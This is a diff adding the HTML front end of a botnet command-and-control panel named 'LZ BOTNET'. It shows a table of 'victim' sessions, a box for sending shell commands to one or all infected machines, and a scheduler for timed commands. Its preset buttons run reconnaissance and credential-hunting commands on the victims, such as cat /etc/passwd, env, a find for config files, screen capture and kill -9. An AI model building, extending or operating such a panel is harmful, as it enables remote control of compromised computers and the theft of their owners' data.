@@ -1,0 +1,548 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>LZ BOTNET</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <a href="#cmd-input" class="skip-link">Skip to command input</a>
+
+    <div
+      class="app"
+      role="application"
+      aria-label="C2 Command and Control Dashboard"
+    >
+      <!-- HEADER -->
+      <header class="header" role="banner">
+        <div class="header-left">
+          <button
+            type="button"
+            id="sidebar-toggle"
+            class="btn btn-sm toggle-btn"
+            aria-label="Toggle command panel"
+            aria-expanded="false"
+            aria-controls="sidebar"
+          >
+            Commands
+          </button>
+          <span class="logo" aria-label="Botnet C2 Dashboard">LZ BOTNET</span>
+        </div>
+        <div class="header-right">
+          <button
+            type="button"
+            id="btn-clear-dead"
+            class="btn btn-sm"
+            aria-label="Remove disconnected victims"
+          >
+            Clear Dead
+          </button>
+          <button
+            type="button"
+            id="btn-kick-all"
+            class="btn btn-sm btn-danger"
+            aria-label="Disconnect all sessions"
+          >
+            Kick All
+          </button>
+          <button
+            type="button"
+            id="btn-refresh"
+            class="btn btn-sm"
+            aria-label="Refresh all data"
+          >
+            Refresh
+          </button>
+          <button
+            type="button"
+            id="panel-toggle"
+            class="btn btn-sm toggle-btn"
+            aria-label="Toggle activity panel"
+            aria-expanded="false"
+            aria-controls="right-panel"
+          >
+            Activity
+          </button>
+        </div>
+      </header>
+
+      <!-- CONTENT -->
+      <div class="content-area">
+        <!-- BACKDROP (mobile) -->
+        <div
+          class="drawer-backdrop"
+          id="drawer-backdrop"
+          aria-hidden="true"
+        ></div>
+
+        <!-- LEFT SIDEBAR -->
+        <aside
+          class="sidebar"
+          id="sidebar"
+          role="complementary"
+          aria-label="Sample commands"
+        >
+          <div class="sidebar-title">Sample Commands</div>
+
+          <div class="cmd-group">
+            <div class="cmd-group-label">System</div>
+            <button
+              type="button"
+              class="cmd-btn"
+              data-cmd="whoami"
+              aria-label="Run whoami"
+            >
+              whoami<span class="desc">current user</span>
+            </button>
+            <button
+              type="button"
+              class="cmd-btn"
+              data-cmd="hostname"
+              aria-label="Run hostname"
+            >
+              hostname<span class="desc">machine name</span>
+            </button>
+            <button
+              type="button"
+              class="cmd-btn"
+              data-cmd="uname -a"
+              aria-label="Run uname -a"
+            >
+              uname -a<span class="desc">system info</span>
+            </button>
+            <button
+              type="button"
+              class="cmd-btn"
+              data-cmd="uptime"
+              aria-label="Run uptime"
+            >
+              uptime<span class="desc">uptime</span>
+            </button>
+            <button
+              type="button"
+              class="cmd-btn"
+              data-cmd="screenshot"
+              aria-label="Capture screenshot"
+            >
+              screenshot<span class="desc">capture screen</span>
+            </button>
+          </div>
+
+          <div class="cmd-group">
+            <div class="cmd-group-label">Processes</div>
+            <button
+              type="button"
+              class="cmd-btn"
+              data-cmd="ps aux"
+              aria-label="Run ps aux"
+            >
+              ps aux<span class="desc">all processes</span>
+            </button>
+            <button
+              type="button"
+              class="cmd-btn"
+              data-cmd="top -l 1 | head -20"
+              aria-label="Run top once"
+            >
+              top -l 1<span class="desc">cpu / memory usage (macOS)</span>
+            </button>
+            <button
+              type="button"
+              class="cmd-btn"
+              data-cmd="kill -9 "
+              aria-label="Kill process"
+            >
+              kill -9 [PID]<span class="desc">force kill process</span>
+            </button>
+          </div>
+
+          <div class="cmd-group">
+            <div class="cmd-group-label">Network</div>
+            <button
+              type="button"
+              class="cmd-btn"
+              data-cmd="ifconfig"
+              aria-label="Run ifconfig"
+            >
+              ifconfig<span class="desc">network interfaces</span>
+            </button>
+            <button
+              type="button"
+              class="cmd-btn"
+              data-cmd="netstat -an"
+              aria-label="Run netstat"
+            >
+              netstat -an<span class="desc">connections</span>
+            </button>
+            <button
+              type="button"
+              class="cmd-btn"
+              data-cmd="cat /etc/hosts"
+              aria-label="View hosts file"
+            >
+              cat /etc/hosts<span class="desc">hosts file</span>
+            </button>
+            <button
+              type="button"
+              class="cmd-btn"
+              data-cmd="curl ifconfig.me"
+              aria-label="Get public IP"
+            >
+              curl ifconfig.me<span class="desc">public IP</span>
+            </button>
+          </div>
+
+          <div class="cmd-group">
+            <div class="cmd-group-label">Files</div>
+            <button
+              type="button"
+              class="cmd-btn"
+              data-cmd="ls -la"
+              aria-label="Run ls -la"
+            >
+              ls -la<span class="desc">list files</span>
+            </button>
+            <button
+              type="button"
+              class="cmd-btn"
+              data-cmd="pwd"
+              aria-label="Run pwd"
+            >
+              pwd<span class="desc">current directory</span>
+            </button>
+            <button
+              type="button"
+              class="cmd-btn"
+              data-cmd="find / -name '*.conf' 2>/dev/null"
+              aria-label="Find config files"
+            >
+              find *.conf<span class="desc">locate config files</span>
+            </button>
+            <button
+              type="button"
+              class="cmd-btn"
+              data-cmd="cat /etc/passwd"
+              aria-label="View passwd"
+            >
+              cat /etc/passwd<span class="desc">user accounts</span>
+            </button>
+          </div>
+
+          <div class="cmd-group">
+            <div class="cmd-group-label">Utility</div>
+            <button
+              type="button"
+              class="cmd-btn"
+              data-cmd="sysinfo"
+              aria-label="Run sysinfo"
+            >
+              sysinfo<span class="desc">full system report</span>
+            </button>
+            <button
+              type="button"
+              class="cmd-btn"
+              data-cmd="cd ~"
+              aria-label="Go to home directory"
+            >
+              cd ~<span class="desc">go to home dir</span>
+            </button>
+            <button
+              type="button"
+              class="cmd-btn"
+              data-cmd="env"
+              aria-label="List environment variables"
+            >
+              env<span class="desc">environment vars</span>
+            </button>
+            <button
+              type="button"
+              class="cmd-btn"
+              data-cmd="clear"
+              aria-label="Clear output console"
+            >
+              clear<span class="desc">clear console output</span>
+            </button>
+          </div>
+        </aside>
+
+        <!-- CENTER -->
+        <main
+          class="center"
+          id="main-content"
+          role="main"
+          aria-label="Main dashboard"
+        >
+          <!-- Stats -->
+          <section class="stats-bar" aria-label="Connection statistics">
+            <div class="stat" role="status" aria-label="Total victims">
+              <div class="stat-label">Total</div>
+              <div class="stat-value cyan" id="stat-total">0</div>
+            </div>
+            <div class="stat" role="status" aria-label="Connected victims">
+              <div class="stat-label">Connected</div>
+              <div class="stat-value green" id="stat-connected">0</div>
+            </div>
+            <div class="stat" role="status" aria-label="Disconnected victims">
+              <div class="stat-label">Dead</div>
+              <div class="stat-value red" id="stat-dead">0</div>
+            </div>
+            <div class="stat" role="status" aria-label="Commands sent">
+              <div class="stat-label">Cmds Sent</div>
+              <div class="stat-value yellow" id="stat-cmds">0</div>
+            </div>
+          </section>
+
+          <!-- Victims Table -->
+          <section class="victims-section" aria-label="Connected victims">
+            <div class="section-header">
+              <span class="section-title">Sessions</span>
+            </div>
+            <table role="grid" aria-label="Victim sessions">
+              <thead>
+                <tr>
+                  <th scope="col">ID</th>
+                  <th scope="col">Alias</th>
+                  <th scope="col">Address</th>
+                  <th scope="col">OS</th>
+                  <th scope="col">Status</th>
+                  <th scope="col">Last Seen</th>
+                  <th scope="col">Actions</th>
+                </tr>
+              </thead>
+              <tbody id="victims-body" aria-live="polite" aria-relevant="all">
+                <tr>
+                  <td colspan="7">
+                    <div class="empty-state">No sessions yet</div>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </section>
+
+          <!-- Command Input -->
+          <section class="command-area" aria-label="Send command">
+            <div class="command-row">
+              <label for="target-select" class="sr-only">Target session</label>
+              <select id="target-select" aria-label="Select target session">
+                <option value="all">All Sessions</option>
+              </select>
+              <div class="cmd-input-wrapper">
+                <label for="cmd-input" class="sr-only">Command to send</label>
+                <input
+                  type="text"
+                  id="cmd-input"
+                  placeholder="Enter command... (Ctrl+K to focus)"
+                  autocomplete="off"
+                  spellcheck="false"
+                  aria-label="Command input"
+                />
+              </div>
+              <button
+                type="button"
+                id="btn-execute"
+                class="btn"
+                aria-label="Execute command"
+              >
+                Execute
+              </button>
+            </div>
+          </section>
+
+          <!-- Output Console -->
+          <section class="output-section" aria-label="Command output">
+            <div class="output-header">
+              <div class="output-meta">
+                <span class="filter-label">Output</span>
+                <div class="output-filters">
+                  <label for="output-filter" class="filter-label"
+                    >Filter:</label
+                  >
+                  <select
+                    id="output-filter"
+                    aria-label="Filter output by session"
+                  >
+                    <option value="all">All Sessions</option>
+                  </select>
+                </div>
+              </div>
+              <button
+                type="button"
+                id="btn-clear-output"
+                class="btn btn-sm"
+                aria-label="Clear output console"
+              >
+                Clear
+              </button>
+            </div>
+            <div
+              id="output"
+              role="log"
+              aria-live="polite"
+              aria-relevant="additions"
+              aria-label="Command output log"
+              tabindex="0"
+            ></div>
+          </section>
+        </main>
+
+        <!-- RIGHT PANEL -->
+        <aside
+          class="right-panel"
+          id="right-panel"
+          role="complementary"
+          aria-label="Activity and schedules"
+        >
+          <div class="panel-tabs" role="tablist" aria-label="Panel sections">
+            <button
+              type="button"
+              class="panel-tab active"
+              role="tab"
+              id="tab-activity"
+              aria-selected="true"
+              aria-controls="page-activity"
+            >
+              Activity
+            </button>
+            <button
+              type="button"
+              class="panel-tab"
+              role="tab"
+              id="tab-schedules"
+              aria-selected="false"
+              aria-controls="page-schedules"
+            >
+              Schedules
+            </button>
+          </div>
+
+          <div class="panel-content">
+            <!-- Activity Feed -->
+            <div
+              class="panel-page active"
+              id="page-activity"
+              role="tabpanel"
+              aria-labelledby="tab-activity"
+            >
+              <div
+                id="activity-feed"
+                aria-live="polite"
+                aria-relevant="additions"
+                aria-label="Recent activity"
+              >
+                <div class="empty-state">No activity yet</div>
+              </div>
+            </div>
+
+            <!-- Schedules -->
+            <div
+              class="panel-page"
+              id="page-schedules"
+              role="tabpanel"
+              aria-labelledby="tab-schedules"
+            >
+              <form
+                class="schedule-form"
+                id="schedule-form"
+                aria-label="Add scheduled command"
+                novalidate
+              >
+                <label for="sched-time">Time (HH:MM)</label>
+                <input
+                  type="text"
+                  id="sched-time"
+                  name="sched-time"
+                  placeholder="14:30"
+                  pattern="\d{2}:\d{2}"
+                  aria-describedby="sched-time-hint"
+                />
+                <span id="sched-time-hint" class="sr-only"
+                  >Enter time in 24-hour HH:MM format</span
+                >
+
+                <label for="sched-target">Target</label>
+                <select
+                  id="sched-target"
+                  name="sched-target"
+                  aria-label="Schedule target session"
+                >
+                  <option value="all">All Sessions</option>
+                </select>
+
+                <label for="sched-cmd">Command</label>
+                <input
+                  type="text"
+                  id="sched-cmd"
+                  name="sched-cmd"
+                  placeholder="whoami"
+                  aria-label="Scheduled command"
+                />
+
+                <button
+                  type="submit"
+                  class="btn btn-sm"
+                  style="margin-top: 10px; width: 100%; justify-content: center"
+                  aria-label="Add schedule"
+                >
+                  Add Schedule
+                </button>
+              </form>
+
+              <div
+                id="schedules-list"
+                aria-live="polite"
+                aria-label="Scheduled commands"
+              >
+                <div class="empty-state">No schedules</div>
+              </div>
+            </div>
+          </div>
+        </aside>
+      </div>
+      <!-- .content-area -->
+    </div>
+    <!-- .app -->
+
+    <!-- Sysinfo Modal -->
+    <div
+      class="modal-overlay"
+      id="sysinfo-modal"
+      role="dialog"
+      aria-modal="true"
+      aria-labelledby="sysinfo-title"
+      aria-hidden="true"
+    >
+      <div class="modal">
+        <div class="modal-header">
+          <h3 id="sysinfo-title">System Info</h3>
+          <button
+            type="button"
+            class="modal-close"
+            id="modal-close-btn"
+            aria-label="Close system info"
+          >
+            &times;
+          </button>
+        </div>
+        <div class="sysinfo-grid" id="sysinfo-grid"></div>
+      </div>
+    </div>
+
+    <!-- Visually-hidden helper class -->
+    <style>
+      .sr-only {
+        position: absolute;
+        width: 1px;
+        height: 1px;
+        padding: 0;
+        margin: -1px;
+        overflow: hidden;
+        clip: rect(0, 0, 0, 0);
+        white-space: nowrap;
+        border: 0;
+      }
+    </style>
+
+    <script src="app.js"></script>
+  </body>
+</html>
